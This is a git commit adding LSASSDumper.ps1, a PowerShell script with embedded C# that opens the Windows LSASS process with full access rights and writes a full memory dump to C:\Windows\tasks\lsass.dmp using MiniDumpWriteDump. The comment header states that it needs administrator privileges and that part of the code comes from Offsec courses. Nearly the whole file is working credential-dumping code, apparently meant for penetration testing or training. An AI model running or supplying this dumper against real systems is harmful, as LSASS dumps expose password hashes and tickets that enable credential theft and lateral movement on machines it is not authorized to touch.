3f6674c07a5300360e9614a828fd19395801b208
vari.sh <15218409+vari-sh@users.noreply.github.com>
2025-01-31 11:38:03 +0100

    Create LSASSDumper.ps1

---
+++ LSASSDumper.ps1
@@ -0,0 +1,47 @@
+<#
+    Author: vari.sh
+            elbae
+
+    Description: This script let you dump LSASS process.
+                  Warning: it needs Administrator privileges
+                  Part of the code came from Offsec courses
+    Usage: .\LSASSDumper.ps1
+#>
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace InMemoryMiniDumpWriteDump
+{
+    public class Dumper
+    {
+        [DllImport("Dbghelp.dll")]
+        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
+        
+        [DllImport("kernel32.dll")]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+
+        public static void Dump()
+        {
+            FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp", FileMode.Create);
+            Process[] lsass = Process.GetProcessesByName("lsass");
+            int lsass_pid = lsass[0].Id;
+            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
+            bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+        }
+    }
+}
+"@
+
+
+# Dumping
+Write-Host "Dumping..."
+[InMemoryMiniDumpWriteDump.Dumper]::Dump()
